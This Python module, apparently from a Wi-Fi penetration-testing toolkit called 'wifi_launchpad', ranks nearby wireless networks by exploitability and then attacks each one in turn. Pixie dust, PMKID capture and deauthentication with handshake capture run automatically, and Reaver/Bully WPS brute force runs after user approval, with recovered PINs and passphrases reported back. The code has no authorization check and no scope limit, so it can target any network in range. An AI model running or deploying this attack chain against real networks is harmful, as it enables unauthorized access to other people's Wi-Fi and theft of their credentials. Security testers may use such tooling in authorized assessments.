"""Target scoring and sequential attack planning.

Scores networks by exploitability, ranks them, and executes a multi-step
escalation strategy one target at a time. Fast attacks (pixie dust, PMKID,
deauth) run automatically. Slow attacks (Reaver/Bully brute force) and
cracking require user approval.
"""

from __future__ import annotations

import logging
from dataclasses import dataclass, field
from typing import Callable, List, Optional

from wifi_launchpad.domain.survey import EncryptionType, Network, ScanResult

logger = logging.getLogger(__name__)

MIN_SIGNAL = -70  # skip targets weaker than this


@dataclass
class ScoredTarget:
    """A network scored and ranked for attack."""

    network: Network
    score: float
    clients: int = 0
    reasons: List[str] = field(default_factory=list)


def rank_targets(scan: ScanResult, min_signal: int = MIN_SIGNAL) -> List[ScoredTarget]:
    """Score and rank networks by exploitability. Highest score first."""
    targets: list[ScoredTarget] = []

    for net in scan.networks:
        score = 0.0
        reasons: list[str] = []

        # Signal quality
        if net.signal_strength >= -50:
            score += 50
            reasons.append("excellent signal")
        elif net.signal_strength >= min_signal:
            score += 30
            reasons.append("good signal")
        else:
            continue  # too weak for reliable capture

        # Attack surface
        client_count = len(scan.get_associated_clients(net.bssid))
        if client_count > 0:
            score += 25
            reasons.append(f"{client_count} client(s)")

        if getattr(net, "wps_enabled", False) and not getattr(net, "wps_locked", False):
            score += 40
            reasons.append("WPS enabled (unlocked)")

        if net.encryption == EncryptionType.WEP:
            score += 50
            reasons.append("WEP (trivially crackable)")

        cipher = getattr(net, "cipher", "") or ""
        if "TKIP" in cipher.upper():
            score += 20
            reasons.append("TKIP mixed mode")

        # Skip conditions
        if net.encryption in (EncryptionType.WPA3,):
            continue  # no offline attack known

        if net.encryption == EncryptionType.OPEN:
            score += 10
            reasons.append("open network (capture only)")

        if score > 0:
            targets.append(ScoredTarget(
                network=net, score=score,
                clients=client_count, reasons=reasons,
            ))

    targets.sort(key=lambda t: t.score, reverse=True)
    return targets


async def attack_target(
    target: ScoredTarget,
    interface: str,
    on_approval: Optional[Callable] = None,
    attack_timeout: int = 120,
) -> dict:
    """Execute escalating attack strategy against a single target.

    Returns dict with: bssid, steps_tried, success, result.
    """
    net = target.network
    bssid = net.bssid
    channel = net.channel
    result = {"bssid": bssid, "ssid": net.ssid, "steps_tried": [], "success": False, "result": ""}

    # Step 1: Pixie dust (if WPS)
    if getattr(net, "wps_enabled", False) and not getattr(net, "wps_locked", False):
        result["steps_tried"].append("pixie_wps")
        try:
            from wifi_launchpad.providers.external.reaver_wps import pixie_dust
            r = await pixie_dust(interface, bssid, channel, timeout=60)
            if r.success:
                result.update(success=True, result=f"Pixie dust: PIN={r.pin} PSK={r.password}")
                return result
        except Exception as exc:
            logger.debug("Pixie dust failed for %s: %s", bssid, exc)

    # Step 2: PMKID capture (clientless)
    result["steps_tried"].append("pmkid")
    pmkid_file = await _attempt_pmkid(interface, bssid, timeout=30)
    if pmkid_file:
        result.update(success=True, result=f"PMKID captured: {pmkid_file}")
        return result

    # Step 3: Deauth + handshake (needs clients)
    if target.clients > 0:
        result["steps_tried"].append("deauth_capture")
        hs_file = await _attempt_deauth(interface, bssid, channel, timeout=attack_timeout)
        if hs_file:
            result.update(success=True, result=f"Handshake captured: {hs_file}")
            return result

    # Step 4: Full Reaver (user approval, hours)
    if getattr(net, "wps_enabled", False) and on_approval:
        if on_approval(f"Run full Reaver WPS brute force on {net.ssid} ({bssid})? This takes hours."):
            result["steps_tried"].append("reaver_brute")
            try:
                from wifi_launchpad.providers.external.reaver_wps import full_brute
                r = await full_brute(interface, bssid, channel)
                if r.success:
                    result.update(success=True, result=f"Reaver: PIN={r.pin} PSK={r.password}")
                    return result
            except Exception as exc:
                logger.debug("Reaver brute failed for %s: %s", bssid, exc)

            # Step 5: Bully fallback (user approval)
            if on_approval(f"Reaver failed. Try Bully on {net.ssid} ({bssid})?"):
                result["steps_tried"].append("bully_brute")
                try:
                    from wifi_launchpad.providers.external.bully_wps import brute_force
                    r = await brute_force(interface, bssid, channel)
                    if r.success:
                        result.update(success=True, result=f"Bully: PIN={r.pin} PSK={r.password}")
                        return result
                except Exception as exc:
                    logger.debug("Bully failed for %s: %s", bssid, exc)

    result["result"] = "all attack steps exhausted"
    return result


async def _attempt_pmkid(interface: str, bssid: str, timeout: int = 30) -> Optional[str]:
    """Try PMKID capture via hcxdumptool."""
    try:
        from wifi_launchpad.services.capture_service import CaptureService
        service = CaptureService()
        if not await service.initialize():
            return None
        success, info = await service.targeted_capture(bssid=bssid)
        return info if success else None
    except Exception:
        return None


async def _attempt_deauth(
    interface: str, bssid: str, channel: Optional[int], timeout: int = 120,
) -> Optional[str]:
    """Deauth + 4-way handshake capture."""
    try:
        from wifi_launchpad.services.capture_service import CaptureService
        service = CaptureService()
        if not await service.initialize():
            return None
        success, info = await service.targeted_capture(bssid=bssid)
        return info if success else None
    except Exception:
        return None


__all__ = ["ScoredTarget", "attack_target", "rank_targets"]
